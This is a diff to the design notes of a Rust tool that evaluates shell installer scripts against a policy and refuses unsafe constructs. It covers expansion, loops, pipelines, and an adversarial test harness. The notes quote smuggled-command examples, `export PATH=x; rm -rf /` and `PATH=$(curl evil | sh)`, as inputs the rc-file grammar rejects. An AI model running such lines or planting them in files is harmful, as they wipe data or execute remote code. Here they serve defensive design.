@@ -144,54 +144,49 @@ src/
                17/17 corpus scripts vs yash-syntax's 13/17, MIT vs
                GPL; see docs/parser-eval.md): hands it the script and
                returns its AST (`parser::ast`, re-exported), or a
-               top-level syntax error. Also renders a `Word` to a
-               literal string when it needs no unsupported expansion —
-               command substitution, most parameter-expansion operators,
-               array/positional/special parameters, and unquoted
-               globbing are all still rejected, but a plain `$VAR`/
-               `${VAR}` reference now resolves against the caller's
-               variable map (state.rs's `Session::variables`, this run's
-               bare-assignment-tracked values) with a fallback to the
-               real process environment — the same fallback `~` already
-               gets for `$HOME` — and an outright-unset name is rejected
-               rather than silently expanding to empty, matching iish's
-               `nounset`-always-on posture.
+               top-level syntax error. Also the home of word expansion,
+               run against an `ExpandCtx` (the live session plus a
+               `Substituter` callback the runner supplies): `$VAR`/
+               `${VAR}` and the common `${VAR:-x}`/`${VAR:=x}`/`${VAR:+x}`/
+               `${#VAR}`/`${VAR#pat}`/`${VAR%pat}` operators, the special
+               and positional parameters (`$?`, `$#`, `$@`, `$*`, `$0`,
+               `$1`, ...), tilde, and `$(command)`/backtick substitution
+               (run through the full runner, output captured) all expand;
+               a `word_fields` entry point does bash's field splitting so
+               `"$@"` forwards argument boundaries and a lone unquoted
+               `$VAR`/`$(cmd)` splits on whitespace. Names resolve through
+               the session's call frames and globals, then the real
+               process environment, then a small shell-identity table
+               (`BASH_VERSION`, `POSIXLY_CORRECT`); an unset name expands
+               to empty by default (bash's behavior) and is refused only
+               after the script's own `set -u`. Array expansion, ANSI-C
+               quoting, and unquoted globbing are still rejected.
   policy.rs    The evaluator: walks `parser::ast` node by node and
-               produces a Verdict { Allow, Prompt(reason), Deny(reason),
-               Group(statements), If(condition, then, elses),
-               AndOrList(first, rest) } per top-level statement. `Group`
-               is a brace group, a call to a function defined earlier in
-               the run (state.rs's `Session` now also carries a function
-               table), or a matched `case` arm — not a single compiled
-               `Action`, since its nested statements must be evaluated
-               one at a time against the live session, exactly like
-               top-level statements; the runner (main.rs) recurses for
-               it, depth-limited to guard against unbounded
-               self-recursion. `If` is `Group`'s counterpart for
-               `if`/`elif`/`else`/`fi`: since which branch (if any) runs
-               depends on the condition's actual — possibly
-               side-effecting — exit status, the runner executes
-               `condition` itself (exempted from iish's usual
-               abort-on-any-failure posture, matching bash's own
-               exemption for a compound command's condition) before
-               recursing into whichever branch it selects. `AndOrList` is
-               the same deferral for a `first && second || third ...`
-               command list: the runner walks it left to right,
-               short-circuiting exactly like bash, and only the
-               *grammatically last* pipeline's real exit status can trip
-               iish's abort-on-failure posture — `false && echo hi`
-               survives it (`echo hi` never ran), `true && false` does
-               not. `test`/`[ ]` is evaluated natively too, with no side
-               effects, and a bare `VAR=value` (or several on one line,
-               no command word) assignment is resolved to an `Assign`
-               action that just records the value in the session — so a
-               `case` value, a condition, or an assigned value made only
-               of literal text, `$VAR` reads, and `&&`/`||`/`test` can
-               resolve completely. Anything still not implemented
-               (pipelines, `for`/`while`/`until`, most redirects, most
-               expansions, `VAR=value cmd` prefix assignment, ...) is
-               denied here — the Unsupported→deny posture lives in the
-               evaluator, not the parser.
+               produces a `Verdict` per top-level statement — `Allow`/
+               `Prompt`/`Deny` for a single compiled `Action`, or one of
+               the deferred forms the runner must interpret against the
+               live session: `Group` (brace group or matched `case` arm),
+               `Call` (a function call, bracketed in a frame so `$1`/`$@`/
+               `local`/`return` work), `If`, `For`, `While` (with an
+               iteration ceiling), `AndOrList` (`&&`/`||`, short-circuited
+               like bash, only the grammatically-last pipeline's status
+               tripping abort-on-failure), `Not` (`! pipeline`, exempt from
+               errexit), `Pipe` (a real multi-stage pipeline, stages run
+               sequentially with each one's stdout buffered as the next's
+               stdin), and `ControlFlow` (`return`/`exit`/`break`/
+               `continue`, which the runner unwinds to the right
+               boundary). `test`/`[ ]` and `case` matching are evaluated
+               natively with no side effects. The native builtins live
+               here too — `local`, `shift`, `unset`, `command -v`/`type`,
+               `cd`, `read`/`true` from `< /dev/tty`, `set -u` as a real
+               toggle — alongside `cat << EOF` here-doc banners and the
+               `> /dev/null`/`2>&1`/`>&2` redirect shapes. Shells and the
+               reopen-a-shell builtins (`eval`, `exec`, `source`) stay
+               hard-denied. Anything still unimplemented (background jobs
+               `&`, `VAR=value cmd` prefix assignment, most redirect
+               targets, array/ANSI-C/glob expansion, ...) is denied here —
+               the Unsupported→deny posture lives in the evaluator, not
+               the parser.
   config.rs    Layered policy (milestone 5): builtin `Config::default()`
                ← config file (TOML via serde) ← CLI overrides. Exposes
                `Verb` (allow/ask/deny) and `NetworkPolicy` per PLAN's
@@ -202,31 +197,41 @@ src/
                compiles each allowed statement into a closed `Action`
                enum (Print, MkDir, Remove, Chmod, Copy, Fetch,
                AppendFile, Sha256Sum, Sha256Check, Subprocess,
-               DefineFunction, Test, Assign, Noop); exec runs actions in
-               Rust — echo/printf rendering, dir creation, ledger-checked
+               DefineFunction, Test, Assign, DeclareLocal, Shift, Unset,
+               SetNounset, ProbeRead, ChangeDir, ReadLine, CommandLookup,
+               Noop); exec runs actions in Rust — echo/printf rendering
+               (with `%b`/octal escapes), dir creation, ledger-checked
                rm/chmod, native `cp` (governed by `overwrite`, like
                `curl -o`/`wget -O`), GET fetches via an in-process,
                timeout- and redirect-bounded HTTP client (ureq) that
                refuses to downgrade an https:// fetch to plaintext on
                redirect, restricted-grammar rc-file appends, native
                SHA-256 compute/verify, direct fork/exec (never a shell)
-               of the subprocess tier's literal argv, registering a
-               function body for a later call, reporting a `test`/`[ ]`
-               expression's already-computed result, and recording a
-               `VAR=value` assignment in the session — and records
-               created paths (and defined functions and variables) in
-               the ledger. A second entry point,
-               `execute_returning_status`, reports a `Subprocess`/`Test`
-               outcome as a `bool` instead of an `Err`, for main.rs's
-               `if`/`while`/`until` condition and `&&`/`||` command-list
-               evaluation.
+               of the subprocess tier's literal argv — with the
+               statement's own stdout/stderr redirects and, in a
+               pipeline, a fed-in stdin — plus the frame/variable/
+               function bookkeeping the builtins need. Output routing
+               goes through an `Out` handle so the *script's* stdout can
+               be captured into a buffer inside a `$(command)`
+               substitution instead of reaching the terminal. A second
+               entry point, `execute_returning_status`, reports a
+               `Subprocess`/`Test`/`CommandLookup`/`ReadLine` outcome as
+               a `bool` instead of an `Err`, for main.rs's
+               `if`/`while`/`until` condition and `&&`/`||` evaluation;
+               `execute_piped` runs one pipeline stage with a fed-in
+               stdin.
   prompt.rs    /dev/tty confirmation for `ask` verdicts (stdin carries
                the script); `--yes`/`--no` resolve asks without a tty
   broker.rs    (planned) privileged worker: `sudo iish --broker`,
                closed enum of operations over a socketpair (see
                "Privilege: the sudo broker")
-  state.rs     Session ledger: paths created during this run — the
-               source of truth for "may delete / may chmod / may run"
+  state.rs     Session state: the ledger of paths created during this
+               run — the source of truth for "may delete / may chmod /
+               may run" — plus the function table, global variables, the
+               `set -u` flag, and a stack of call frames (each carrying a
+               function call's positional parameters and its `local`
+               declarations, so `$1`/`$@`/`$#` and dynamically-scoped
+               `local` resolve correctly).
 ```
 
 Execution model: **interleaved** (decided). Installers branch on
@@ -311,24 +316,48 @@ doubles as the integration-test corpus later.
    subprocess tier nulls the child's stderr, native actions never
    write the script's output there anyway) — though most real
    installers still deny somewhere on `VAR=value cmd` prefix
-   assignment, a redirect shape beyond `>>` and `2> /dev/null`, a
-   pipeline `!` negation, a special/positional parameter (`$@`, `$1`,
-   ...), a richer parameter-expansion operator (`${VAR:-default}`,
-   `${VAR#pattern}`, ...), or command substitution — none of which are
-   implemented yet.
-   The evaluator still denies `for`/`while`/`until` entirely, so none of
-   the 17 real corpus scripts run to completion, but several now
-   progress well past their own function/`set`/brace-group/`if`/`case`
-   setup before stopping on one of those remaining gaps.
+   assignment or a redirect shape beyond the discard/append set.
+   Command substitution (`$(cmd)`/backticks), the special and positional
+   parameters (`$?`, `$#`, `$@`, `$*`, `$1`, ...), the common
+   parameter-expansion operators (`${VAR:-default}`, `${VAR:=x}`,
+   `${VAR:+x}`, `${#VAR}`, and the `${VAR#pat}`/`${VAR%pat}` prefix/suffix
+   removals), `for`/`while`/`until` loops (with `break`/`continue` and an
+   iteration ceiling), real multi-stage pipelines (`uname | tr ...`, run
+   sequentially with each stage's stdout buffered as the next stage's
+   stdin), `! pipeline` negation, and the builtins installers reach for
+   (`local`, `return`/`exit`/`shift`/`unset`, `command -v`/`type`,
+   native `cd`, and `read`/`true` from `< /dev/tty`) are all implemented
+   now, along with here-documents (`cat << EOF` banners), `> /dev/null`/
+   `2>&1`/`>&2` redirects, and the `%b`/octal `printf` escapes. `set -u`
+   is honored as a real toggle (unset expands to empty by default, bash's
+   behavior, and is refused only after the script itself opts in).
+   With those in place every one of the seven curated corpus installers
+   now runs its *entire* platform-detection and setup logic and stops
+   only at a genuine external boundary — the network (downloads, under
+   `--network none`), an interactive `/dev/tty` prompt, `curl … | sh`
+   (refused by design), or the one still-unimplemented construct
+   (background jobs, `&`, which nvm uses to parallelize its downloads).
    `scripts/verify-installers.sh` (Docker-isolated,
    network-disabled, runnable in CI or by hand — see
    `.github/workflows/installer-verify.yml`) runs a curated,
    user-space-only subset of the corpus through the real binary and
-   pins *why* each currently stops, as a regression guard: the pin
-   breaking means either a regression or genuine milestone-7 progress,
-   either way worth a human's attention. If/when a script ever runs to
-   completion, the same harness checks the resulting program is
-   actually usable, not just that iish didn't refuse. The same script
+   pins *where* each stops, as a regression guard: the pin breaking means
+   either a regression or genuine further progress, either way worth a
+   human's attention. Stopping at the pinned boundary is reported as
+   **XFAIL** — an expected, known-tracked non-completion that does not
+   fail the suite — so the gate is green-by-default while honestly never
+   calling a non-completion a pass; only an *unexpected* outcome (a pin
+   breaking, a completed install whose program isn't usable, a broken
+   self-check or adversarial case) fails it. The completed-install path
+   is exercised for real today by the harness self-check (a synthetic
+   offline installer that runs to completion and whose installed program
+   is then verified) and by an end-to-end `tests/cli.rs` case that drives
+   a realistic download-based installer — functions, `case` detection,
+   `local`, a `for` loop, a real (local-HTTP) download, `chmod +x`, and a
+   PATH export — all the way to a working program. If/when a real corpus
+   script ever runs to completion (e.g. once the harness grows a local
+   payload mirror for the offline-completable ones), the same paired
+   verify command decides pass/fail for real. The same script
    also runs a small adversarial corpus (`corpus/adversarial/`) of
    synthetic installers that attempt real attacks — root wipe, rc-file
    persistence injection, writing outside the env-file grammar, and a
@@ -343,8 +372,12 @@ doubles as the integration-test corpus later.
    real `cp`: the policy places no restriction on what a source may
    name (copying only reads), so a symlink there guards nothing — and
    refusing it broke `cp /bin/true ...` on merged-usr systems where
-   `/bin` itself is a symlink to `usr/bin`. *(in progress — harness in place,
-   functions/brace-groups/`set`/native `cp`/`if`/`case`/`test`/`&&`/`||`/
-   bare assignment landed, corpus still 0/17 to completion)*
+   `/bin` itself is a symlink to `usr/bin`. The env-file append grammar
+   also rejects a command smuggled into an assignment value (`export
+   PATH=x; rm -rf /`, `PATH=$(curl evil | sh)`): the value must be a
+   single word, since a later shell *sources* the rc file. *(in progress
+   — every curated corpus installer now runs its full logic and stops only
+   at an external boundary or background jobs; the completed-install path
+   is proven by the self-check and an end-to-end download-installer test)*
 8. **Sandboxing investigation** — Landlock/seccomp/Seatbelt for second
    stages (post-first-iteration).
